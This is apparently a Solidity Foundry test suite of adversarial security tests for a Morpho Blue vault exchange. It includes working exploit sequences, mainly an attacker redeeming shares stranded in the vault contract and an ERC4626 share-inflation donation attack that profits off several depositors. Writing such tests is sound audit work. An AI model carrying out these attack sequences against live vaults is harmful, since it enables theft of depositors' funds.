// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IMorpho, MarketParams} from "@crane/contracts/external/morpho/blue/interfaces/IMorpho.sol";
import {ERC20Mock} from "@crane/contracts/external/morpho/blue/mocks/ERC20Mock.sol";
import {ORACLE_PRICE_SCALE} from "@crane/contracts/external/morpho/blue/libraries/ConstantsLib.sol";
import {ISecurePullErrors} from "contracts/interfaces/ISecurePullErrors.sol";
import {
    IMorphoBlueStandardExchange
} from "contracts/vaults/standard/exchange/protocols/morpho/blue/IMorphoBlueStandardExchange.sol";
import {
    IMorphoBlueStandardExchangeDFPkg
} from "contracts/vaults/standard/exchange/protocols/morpho/blue/IMorphoBlueStandardExchangeDFPkg.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {
    TestBase_MorphoBlueStandardExchange
} from "contracts/vaults/standard/exchange/protocols/morpho/blue/test/bases/TestBase_MorphoBlueStandardExchange.sol";
import {AtomicPretransferCaller} from "contracts/test/stubs/AtomicPretransferCaller.sol";

/// gx-morpho-blue-se: adversarial execution for Morpho Blue SE (HEAD 2ba07631).
contract MorphoBlueSE_GX is TestBase_MorphoBlueStandardExchange {
    address internal lp = makeAddr("honestLP");

    function _val(address who) internal view returns (uint256) {
        return se4626.convertToAssets(IERC20(se).balanceOf(who));
    }

    function _dep(address who, uint256 amt) internal returns (uint256 s) {
        if (loanToken.balanceOf(who) < amt) loanToken.setBalance(who, loanToken.balanceOf(who) + amt);
        vm.startPrank(who);
        loanToken.approve(se, type(uint256).max);
        s = se4626.deposit(amt, who);
        vm.stopPrank();
    }

    function _borrow(uint256 collateral, uint256 debt) internal {
        _borrowFromMarket(collateral, debt);
    }

    /* ---------------------------------------------------------------- */
    /* T1: IERC4626 owner=address(this) burns (P2 morpho-erc4626-owner-self) */
    /* ---------------------------------------------------------------- */

    function test_T1_ownerSelf_redeem_EOA_claimsStrandedShares() public {
        _dep(lp, 500_000 ether);
        address victim = makeAddr("victimWallet");
        uint256 vs = _dep(victim, 100_000 ether);
        // victim step 1 of a 2-step pretransferred unwrap (or a misdirected transfer)
        vm.prank(victim);
        IERC20(se).transfer(se, vs / 2);
        uint256 stranded = IERC20(se).balanceOf(se);
        uint256 lpBefore = _val(lp);

        // control: EOA cannot use the pretransferred path
        vm.prank(attacker);
        vm.expectRevert(ISecurePullErrors.EOAPretransferNotAllowed.selector);seIn.exchangeIn(IERC20(se), stranded, IERC20(address(loanToken)), 0, attacker, true, _deadline());

        uint256 a0 = loanToken.balanceOf(attacker);
        vm.prank(attacker); // plain EOA, no allowance from anyone
        uint256 out = se4626.redeem(stranded, attacker, se);
        uint256 profit = loanToken.balanceOf(attacker) - a0;
        console2.log("T1 stranded shares", stranded);
        console2.log("T1 attacker EOA profit (loan)", profit);
        console2.log("T1 victim loss (loan)", out);
        assertEq(profit, out);
        assertApproxEqAbs(profit, 50_000 ether, 2, "EOA took victim resting value");
        assertEq(IERC20(se).balanceOf(se), 0);
        assertApproxEqAbs(_val(lp), lpBefore, 2, "LP unaffected");
    }

    function test_T1b_ownerSelf_withdraw_EOA() public {
        _dep(lp, 500_000 ether);
        address victim = makeAddr("victimWallet");
        uint256 vs = _dep(victim, 100_000 ether);
        vm.prank(victim);
        IERC20(se).transfer(se, vs);
        uint256 a0 = loanToken.balanceOf(attacker);
        uint256 maxW = se4626.convertToAssets(IERC20(se).balanceOf(se));
        vm.prank(attacker);
        se4626.withdraw(maxW, attacker, se);
        console2.log("T1b withdraw owner=se profit", loanToken.balanceOf(attacker) - a0);
        assertApproxEqAbs(loanToken.balanceOf(attacker) - a0, 100_000 ether, 2);
    }

    function test_T1c_ownerSelf_cannotTouchBookedLPShares() public {
        // owner=se only reaches shares the diamond itself holds; no LP shares are reachable.
        _dep(lp, 500_000 ether);
        vm.prank(attacker);
        vm.expectRevert();
        se4626.redeem(1, attacker, se);
        vm.prank(attacker);
        vm.expectRevert();
        se4626.redeem(1, attacker, lp);
    }

    /* ---------------------------------------------------------------- */
    /* T2: share inflation, decimalOffset = 0 (DFPkg initAccount)         */
    /* ---------------------------------------------------------------- */

    function test_T2_inflation_permissionlessDeploy() public {
        // An unprivileged account can create a Morpho market and deploy the canonical SE for it.
        ERC20Mock coll2 = new ERC20Mock();
        MarketParams memory p2 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(coll2),
            oracle: address(oracle),
            irm: address(irm),
            lltv: DEFAULT_LLTV
        });
        vm.startPrank(attacker);
        morpho.createMarket(p2);
        address v = morphoBlueStandardExchangeDFPkg.deployVault(
            IMorphoBlueStandardExchangeDFPkg.PkgArgs({morpho: morpho, marketParams: p2})
        );
        vm.stopPrank();
        assertTrue(v != address(0));
        assertEq(IERC20(v).totalSupply(), 0, "fresh, no seed / dead shares");
    }

    function _inflationRun(uint256 D, uint256[] memory victims) internal returns (int256 attackerPnl, uint256 victimLoss) {
        uint256 a0 = loanToken.balanceOf(attacker);
        vm.startPrank(attacker);
        uint256 s = se4626.deposit(1, attacker);
        assertEq(s, 1);
        loanToken.approve(address(morpho), D);
        morpho.supply(marketParams, D, 0, se, ""); // donation that no pretransfer sweeper can claim
        vm.stopPrank();

        for (uint256 i; i < victims.length; i++) {
            address v = address(uint160(0xBEEF0000 + i));
            uint256 vsh = _dep(v, victims[i]);
            uint256 vval = se4626.convertToAssets(vsh);
            console2.log("victim deposit", victims[i]);
            console2.log("  shares", vsh);
            console2.log("  value after", vval);
            victimLoss += victims[i] - vval;
        }
        vm.prank(attacker);
        se4626.redeem(1, attacker, attacker);
        attackerPnl = int256(loanToken.balanceOf(attacker)) - int256(a0);
        console2.log("attacker net pnl (loan units, fair)");
        console2.logInt(attackerPnl);
        console2.log("victims total loss", victimLoss);
        console2.log("orphaned NAV left (virtual share)", se4626.totalAssets());
    }

    function test_T2a_inflation_singleVictim_unprofitable() public {
        uint256[] memory v = new uint256[](1);
        v[0] = 4_999 ether;
        (int256 pnl, uint256 loss) = _inflationRun(10_000 ether, v);
        assertEq(loss, 4_999 ether, "victim loses 100% (griefing)");
        assertLt(pnl, 0, "single victim: attacker loses (virtual +1 share)");
    }

    function test_T2b_inflation_multiVictim_profit() public {
        uint256[] memory v = new uint256[](4);
        v[0] = 5_000 ether;
        v[1] = 5_000 ether;
        v[2] = 5_000 ether;
        v[3] = 5_000 ether;
        (int256 pnl, uint256 loss) = _inflationRun(10_000 ether, v);
        assertEq(loss, 20_000 ether);
        assertGt(pnl, 0, "4 zero-share victims: attacker profits");
    }

    function test_T2c_inflation_minOutProtects() public {
        vm.startPrank(attacker);
        se4626.deposit(1, attacker);
        loanToken.approve(address(morpho), 10_000 ether);
        morpho.supply(marketParams, 10_000 ether, 0, se, "");
        vm.stopPrank();
        vm.prank(user);
        vm.expectRevert();// Slippage
        seIn.exchangeIn(IERC20(address(loanToken)), 4_000 ether, IERC20(se), 1, user, false, _deadline());
    }

    /* ---------------------------------------------------------------- */
    /* T3: pretransfer NAV adjustments, honest integrator                 */
    /* ---------------------------------------------------------------- */

    function test_T3a_pretransfer_exactOut_wrap_conserves() public {
        _dep(lp, 300_000 ether);
        _borrow(1_000_000 ether, 100_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 lpBefore = _val(lp);
        AtomicPretransferCaller c = new AtomicPretransferCaller();
        uint256 push = 60_000 ether;
        loanToken.setBalance(user, push);
        vm.prank(user);
        loanToken.approve(address(c), push);
        uint256 want = 40_000 ether;
        uint256 quoted = seOut.previewExchangeOut(IERC20(address(loanToken)), IERC20(se), want);
        vm.prank(user);
        bytes memory r = c.consumePretransfer(
            IERC20(address(loanToken)), user, se, push,
            abi.encodeCall(IStandardExchangeOut.exchangeOut, (IERC20(address(loanToken)), push, IERC20(se), want, user, true, _deadline()))
        );
        uint256 paid = abi.decode(r, (uint256));
        console2.log("T3a quoted", quoted);
        console2.log("T3a paid", paid);
        console2.log("T3a refund to caller", loanToken.balanceOf(address(c)));
        assertEq(paid, quoted, "pretransfer price == non-pretransfer quote");
        assertEq(loanToken.balanceOf(address(c)), push - paid, "exact refund");
        assertEq(IERC20(se).balanceOf(user), want);
        assertGe(_val(lp) + 1, lpBefore, "LP not diluted");
        assertLe(se4626.convertToAssets(want), paid, "buyer got <= paid");
    }

    function test_T3b_pretransfer_exactIn_wrap_conserves() public {
        _dep(lp, 300_000 ether);
        _borrow(1_000_000 ether, 100_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 lpBefore = _val(lp);(uint256 quoted,) = seIn.previewExchangeIn(IERC20(address(loanToken)), 50_000 ether, IERC20(se));
        AtomicPretransferCaller c = new AtomicPretransferCaller();
        loanToken.setBalance(user, 50_000 ether);
        vm.prank(user);
        loanToken.approve(address(c), 50_000 ether);
        vm.prank(user);
        bytes memory r = c.consumePretransfer(
            IERC20(address(loanToken)), user, se, 50_000 ether,
            abi.encodeCall(IStandardExchangeIn.exchangeIn, (IERC20(address(loanToken)), 50_000 ether, IERC20(se), 0, user, true, _deadline()))
        );
        (uint256 got,) = abi.decode(r, (uint256, uint256));
        assertEq(got, quoted, "pretransfer mint == quote");
        assertGe(_val(lp) + 1, lpBefore, "LP not diluted");
    }

    /* ---------------------------------------------------------------- */
    /* T4: interest accrual timing                                        */
    /* ---------------------------------------------------------------- */

    function test_T4_staleAccrual_justInTimeDeposit_noProfit() public {
        _dep(lp, 100_000 ether);
        _borrow(1_000_000 ether, 80_000 ether);
        vm.warp(block.timestamp + 365 days); // nobody touched Morpho: interest pending, not accrued
        uint256 lpBefore = _val(lp);
        assertGt(lpBefore, 100_000 ether, "NAV view includes pending interest");
        uint256 a0 = loanToken.balanceOf(attacker);
        vm.startPrank(attacker);
        uint256 s = se4626.deposit(900_000 ether, attacker);
        se4626.redeem(s, attacker, attacker);
        vm.stopPrank();
        int256 pnl = int256(loanToken.balanceOf(attacker)) - int256(a0);
        console2.log("T4 lp value with pending interest", lpBefore);
        console2.log("T4 JIT attacker pnl");
        console2.logInt(pnl);
        assertLe(pnl, 0, "JIT deposit captures no pre-accrual interest");
        assertGe(_val(lp) + 2, lpBefore, "LP keeps interest");
    }

    /* ---------------------------------------------------------------- */
    /* T5: bad-debt socialization                                         */
    /* ---------------------------------------------------------------- */

    function test_T5_badDebt_proRata_andLiveness() public {
        _dep(lp, 100_000 ether);
        address lp2 = makeAddr("lp2");
        _dep(lp2, 100_000 ether);
        _borrow(100_000 ether, 79_000 ether);
        uint256 navBefore = se4626.totalAssets();
        oracle.setPrice(ORACLE_PRICE_SCALE / 2);
        loanToken.setBalance(LIQUIDATOR, 100_000 ether);
        vm.prank(LIQUIDATOR);
        morpho.liquidate(marketParams, BORROWER, 100_000 ether, 0, "");
        uint256 navAfter = se4626.totalAssets();
        console2.log("T5 nav before", navBefore);
        console2.log("T5 nav after bad debt", navAfter);
        assertLt(navAfter, navBefore);
        assertApproxEqAbs(_val(lp), _val(lp2), 2, "loss pro-rata");

        // late depositor after realization is not charged for the old bad debt
        address late = makeAddr("late");
        uint256 ls = _dep(late, 50_000 ether);
        assertApproxEqAbs(se4626.convertToAssets(ls), 50_000 ether, 2);

        // everyone can exit (liveness), sum of exits <= nav
        uint256 tot;
        address[3] memory hs = [lp, lp2, late];
        for (uint256 i; i < 3; i++) {
            uint256 b0 = loanToken.balanceOf(hs[i]);
            uint256 mr = se4626.maxRedeem(hs[i]);
            assertEq(mr, IERC20(se).balanceOf(hs[i]), "full redeem available");
            vm.prank(hs[i]);
            se4626.redeem(mr, hs[i], hs[i]);
            tot += loanToken.balanceOf(hs[i]) - b0;
        }
        assertApproxEqAbs(loanToken.balanceOf(late), 50_000 ether, 2);
        assertLe(tot, navAfter + 50_000 ether);
        console2.log("T5 residual nav", se4626.totalAssets());
    }

    /* ---------------------------------------------------------------- */
    /* T6: liveness at high utilization, maxRedeem/maxWithdraw boundary   */
    /* ---------------------------------------------------------------- */

    function testFuzz_T6_maxRedeem_maxWithdraw_boundary(uint256 repay, uint256 dt) public {
        repay = bound(repay, 1, 100_000 ether);
        dt = bound(dt, 0, 400 days);
        _dep(lp, 100_000 ether);
        _borrow(1_000_000 ether, 100_000 ether); // 100% utilization
        assertLe(se4626.maxWithdraw(lp), 0);
        vm.warp(block.timestamp + dt);
        loanToken.setBalance(BORROWER, repay);
        vm.prank(BORROWER);
        morpho.repay(marketParams, repay, 0, BORROWER, "");

        uint256 mr = se4626.maxRedeem(lp);
        if (mr > 0) {
            uint256 snap = vm.snapshotState();
            vm.prank(lp);
            se4626.redeem(mr, lp, lp);
            vm.revertToState(snap);
        }
        if (mr < IERC20(se).balanceOf(lp)) {
            vm.prank(lp);
            vm.expectRevert();
            se4626.redeem(mr + 1, lp, lp);
        }
        uint256 mw = se4626.maxWithdraw(lp);
        if (mw > 0) {
            vm.prank(lp);
            se4626.withdraw(mw, lp, lp);
        }
    }

    /* ---------------------------------------------------------------- */
    /* T7: full exit then re-entry; T8 round-trip fuzz                    */
    /* ---------------------------------------------------------------- */

    function test_T7_fullExit_reentry_fair() public {
        uint256 s = _dep(lp, 100_000 ether);
        _borrow(1_000_000 ether, 50_000 ether);
        vm.warp(block.timestamp + 100 days);
        loanToken.setBalance(BORROWER, 200_000 ether);
        vm.startPrank(BORROWER);
        morpho.repay(marketParams, 0, morpho.position(marketId, BORROWER).borrowShares, BORROWER, "");
        vm.stopPrank();
        vm.prank(lp);
        se4626.redeem(s, lp, lp);
        uint256 dust = se4626.totalAssets();
        console2.log("T7 residual after full exit", dust);
        assertLe(dust, 2);
        uint256 s2 = _dep(user, 10 ether);
        assertGe(se4626.convertToAssets(s2) + 2, 10 ether);
    }

    function testFuzz_T8_roundTrip_noProfit(uint256 amt, uint256 donation, uint256 dt, bool viaExactOut) public {
        amt = bound(amt, 1, 500_000 ether);
        donation = bound(donation, 0, 50_000 ether);
        dt = bound(dt, 0, 200 days);
        _dep(lp, 200_000 ether);
        _borrow(1_000_000 ether, 100_000 ether);
        if (donation > 0) {
            loanToken.setBalance(address(this), donation);
            loanToken.transfer(se, donation);
        }
        vm.warp(block.timestamp + dt);
        uint256 lpBefore = _val(lp);
        uint256 a0 = loanToken.balanceOf(attacker);
        vm.startPrank(attacker);
        uint256 s;
        if (viaExactOut) {
            uint256 want = se4626.previewDeposit(amt);
            if (want == 0) { vm.stopPrank(); return; }
            se4626.mint(want, attacker);
            s = want;
        } else {
            s = se4626.deposit(amt, attacker);
        }
        uint256 mr = se4626.maxRedeem(attacker);
        if (mr > 0) se4626.redeem(mr, attacker, attacker);
        vm.stopPrank();
        uint256 back = loanToken.balanceOf(attacker) + se4626.convertToAssets(IERC20(se).balanceOf(attacker));
        assertLe(back, a0 + 1, "no round-trip profit");
        assertGe(_val(lp) + 2, lpBefore, "LP not drained by round-trip");
    }
}
